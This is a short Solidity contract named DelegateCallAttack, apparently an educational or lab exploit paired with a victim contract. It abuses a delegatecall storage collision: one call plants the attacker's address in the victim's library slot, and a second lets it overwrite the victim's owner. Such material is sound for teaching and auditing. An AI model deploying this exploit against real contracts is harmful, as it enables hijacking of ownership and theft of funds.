// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./DelegateCallVictim.sol";

contract DelegateCallAttack {
    address public lib;
    address public owner;
    DelegateCallVictim public victim;

    constructor(DelegateCallVictim _victim) {
        victim = _victim;
    }

    function attack() public {
        uint256 myAddress = uint256(uint160(address(this)));
        victim.setPrice(myAddress);
        victim.setPrice(123);
    }

    function setPrice(uint256 _price) public {
        owner = msg.sender;
    }
    
}